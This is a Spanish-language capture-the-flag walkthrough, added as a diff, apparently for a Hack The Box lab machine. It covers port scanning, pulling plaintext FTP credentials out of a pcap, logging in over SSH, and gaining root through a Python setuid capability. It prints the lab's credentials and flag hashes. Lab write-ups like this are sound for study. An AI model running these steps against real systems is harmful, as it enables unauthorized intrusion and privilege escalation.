@@ -1,0 +1,73 @@
+1) Conocemos con que máquina estamos tratando, usamos ping para hacer una trasa ismp
+$ ping -c 10.10.10.245 
+# El ttl será de 64 o 63, por lo que es máquina Linux, comprobamos con whichSystem.py
+whichSystem.py 10.10.10.245
+# El ttl es 63 por la máquina intermidiaria
+ping -c 10.10.10.245 -R
+
+2) Ocupamos nmap para obtener los posibles puertos abiertos
+$ nmap 10.10.10.245
+$ nmap -p- --open -T5 -v -n 10.10.10.245 # -n: para evitar DNS y hacer más rápido el escáneo
+$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.245  -oG allPorts # -Pn para evitar DNS
+$ extractPorts allPorts 
+
+3) Lanzaremos scripts básicos de reconocimientos para los puertos
+$ nmap -sCV -p21,22,80 10.10.10.245 -oN targeted
+
+4) Ver las propiedas de la página web 
+$ whatweb http://10.10.10.245
+
+5) Desde la página web entramos y descargamos:
+http://10.10.10.245/data/0
+
+6) Abrimos y analizamos el archivo .pcap
+$ tshark -r 0.pcap 2>/dev/null
+# Para verlos mejor:
+$ tshark -r 0.cap -Y "ftp" 2>/dev/null
+$ tshark -r 0.pcap -Y "ftp" -Tjson 2>/dev/null
+
+# Podemos ver el payload en hexadecimal
+$ tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null
+# Para verlo en texto legible
+$ tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
+
+USER nathan
+PASS Buck3tH4TF0RM3!
+
+7) Ahora accedemos desde ftp
+$ ftp 
+$ dir
+$ get user.txt
+$ quit 
+$ cat user.txt
+
+750aa210e2b4963aecb8423c6316c427
+
+7.5) Accedemos por ssh
+ssh nathan@10.10.10.245
+
+
+8) Accedemos a root
+$ sudo -l # Para comprobar grupos
+$ find \-perm -4000 2>/dev/null # Para revisar bionariso suid
+$ getcap -r / 2>/dev/null
+# SI tiene python...
+$ python3.8
+$ import os 
+$ os.setuid(0)
+$ os.system("bash")
+$ cd .. 
+$ cd ..
+$ cd root
+$ cat root.txt
+
+e0575e6b4f6b74ed428fbb1a96836e6e
+
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+
+
+
+
+NOTAS DE COMANDOS
+$ which whichSystem.py | xargs bat
+
